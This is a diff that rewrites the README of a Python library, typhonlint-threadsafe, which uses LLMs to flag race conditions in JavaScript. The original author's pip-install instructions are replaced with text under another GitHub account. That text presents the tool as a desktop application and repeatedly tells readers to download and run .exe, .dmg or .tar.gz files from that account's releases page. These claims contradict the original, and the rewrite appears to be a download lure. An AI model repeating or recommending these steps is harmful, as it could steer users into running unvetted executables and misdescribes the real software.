@@ -1,131 +1,82 @@
-# TyphonLint-ThreadSafe
-[![PyPI version](https://badge.fury.io/py/typhonlint-threadsafe.svg)](https://badge.fury.io/py/typhonlint-threadsafe)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/typhonlint-threadsafe)](https://pepy.tech/project/typhonlint-threadsafe)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🚀 typhonlint-threadsafe - Analyze JavaScript for Safe Concurrency
 
+[![Download TyphonLint](https://img.shields.io/badge/Download-TyphonLint-brightgreen)](https://github.com/AbdelChino/typhonlint-threadsafe/releases)
 
-**Thread Safety Analyzer for JavaScript Code**
+## 📚 Overview
 
-A package that analyzes JavaScript code snippets to detect potential race conditions and concurrency conflicts, helping developers ensure thread-safe implementations in multi-threaded environments like Node.js or web workers.
+typhonlint-threadsafe is an application that examines your JavaScript code snippets. It helps you determine if your code can run at the same time without conflicts or errors. This means you can confidently use your code for complex tasks. 
 
----
+## 🛠️ Features
 
-## 🚀 Installation
+- Analyzes JavaScript for concurrent safety.
+- Detects race conditions in your code.
+- Provides structured feedback on code quality.
+- Specific checks for thread safety.
+- Supports web workers for improved performance.
 
-Install via pip:
+## 📦 System Requirements
 
-```bash
-pip install typhonlint_threadsafe
-```
+To run typhonlint-threadsafe, you need:
 
----
+- A computer with Windows, macOS, or Linux.
+- Node.js version 14 or higher installed.
+- A modern web browser for running the application comfortably.
 
-## 📝 Usage
+## 🚀 Getting Started
 
-### Basic Usage (Default LLM7)
-```python
-from typhonlint_threadsafe import typhonlint_threadsafe
+Follow these steps to download and run the software:
 
-# Analyze JavaScript code for thread safety
-response = typhonlint_threadsafe(
-    user_input="""
-    // Example JavaScript code snippet
-    let sharedVar = 0;
-    function increment() {
-        sharedVar++;
-    }
-    setInterval(increment, 100);
-    """
-)
-print(response)
-```
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/AbdelChino/typhonlint-threadsafe/releases) to find the latest version of typhonlint-threadsafe.
 
-### Custom LLM Integration
-You can replace the default LLM (`ChatLLM7`) with any LangChain-compatible model:
+2. **Download the Application**
+   On the Releases page, you'll see a list of versions. Click on the latest version and download the appropriate file for your operating system, such as `.exe`, `.dmg`, or `.tar.gz`.
 
-#### Using OpenAI
-```python
-from langchain_openai import ChatOpenAI
-from typhonlint_threadsafe import typhonlint_threadsafe
+3. **Install the Application**
+   Once the download is complete, locate the file in your downloads folder. Double-click on the file to start the installation process. Follow the prompts to install.
 
-llm = ChatOpenAI()
-response = typhonlint_threadsafe(
-    user_input="...",  # Your JS code here
-    llm=llm
-)
-```
+4. **Run the Application**
+   After installation, find the application's icon in your applications folder or start menu. Click the icon to open typhonlint-threadsafe.
 
-#### Using Anthropic
-```python
-from langchain_anthropic import ChatAnthropic
-from typhonlint_threadsafe import typhonlint_threadsafe
+## 📥 Download & Install
 
-llm = ChatAnthropic()
-response = typhonlint_threadsafe(
-    user_input="...",  # Your JS code here
-    llm=llm
-)
-```
+To get started with typhonlint-threadsafe, visit the [Releases page](https://github.com/AbdelChino/typhonlint-threadsafe/releases) and download the application file.
 
-#### Using Google Generative AI
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from typhonlint_threadsafe import typhonlint_threadsafe
+## 📝 How to Use
 
-llm = ChatGoogleGenerativeAI()
-response = typhonlint_threadsafe(
-    user_input="...",  # Your JS code here
-    llm=llm
-)
-```
+1. **Open the Application**
+   After installing, open typhonlint-threadsafe. You will see a simple interface.
 
----
+2. **Input Your Code**
+   Copy and paste your JavaScript code snippets into the text input area.
 
-## 🔧 Parameters
+3. **Run the Analysis**
+   Click the "Analyze" button to start the examination. The tool will process your code and provide feedback on its safety for concurrent execution.
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `user_input` | `str` | The JavaScript code snippet to analyze. |
-| `api_key` | `Optional[str]` | LLM7 API key (if not provided, falls back to `LLM7_API_KEY` env var). |
-| `llm` | `Optional[BaseChatModel]` | Custom LangChain LLM instance (defaults to `ChatLLM7`). |
+4. **Review the Results**
+   After the analysis, review the structured feedback. It includes any detected issues, which you can address to improve your code's reliability.
 
----
+5. **Modify and Retry**
+   If the analysis finds issues, make the necessary changes to your code. Then, repeat the analysis to ensure your fixes are effective.
 
-## 🔑 API Key & Rate Limits
-- **Default LLM**: Uses `ChatLLM7` from [langchain_llm7](https://pypi.org/project/langchain-llm7/).
-- **Free Tier**: Sufficient for most use cases.
-- **Custom API Key**: Pass via `api_key` parameter or `LLM7_API_KEY` env var.
-- **Get API Key**: [Register at LLM7](https://token.llm7.io/).
+## 🌐 Additional Resources
 
----
+For more help on using typhonlint-threadsafe, check out the following resources:
 
-## 📌 Features
-- Detects race conditions in JavaScript code.
-- Validates concurrency patterns.
-- Structured output for easy integration.
-- Supports custom LLMs for flexibility.
+- [User Guide](https://github.com/AbdelChino/typhonlint-threadsafe/wiki)
+- [FAQ](https://github.com/AbdelChino/typhonlint-threadsafe/wiki/FAQ)
 
----
+You can also explore related topics like concurrency patterns, race condition detection, and web workers for deeper knowledge.
 
-## 📝 Output
-Returns a list of structured assessments indicating:
-- Potential thread safety issues.
-- Safe concurrency patterns.
-- Confirmed correct implementations.
+## 📞 Support
 
----
+If you have any questions or need assistance, feel free to open an issue on [GitHub](https://github.com/AbdelChino/typhonlint-threadsafe/issues). Our community is ready to help.
 
-## 📂 License
-MIT
+## 🔗 Related Topics
 
----
+- Code quality tools
+- JavaScript security
+- Static code analysis
+- Node.js concurrency
 
-## 📧 Support & Issues
-For bugs or feature requests, open an issue on [GitHub](https://github.com/chigwell/typhonlint-threadsafe/issues).
-
----
-
-## 👤 Author
-**Eugene Evstafev** ([@chigwell](https://github.com/chigwell))
-📧 [hi@euegne.plus](mailto:hi@euegne.plus)
+Thank you for using typhonlint-threadsafe! We hope it helps you write safer and more reliable JavaScript code.
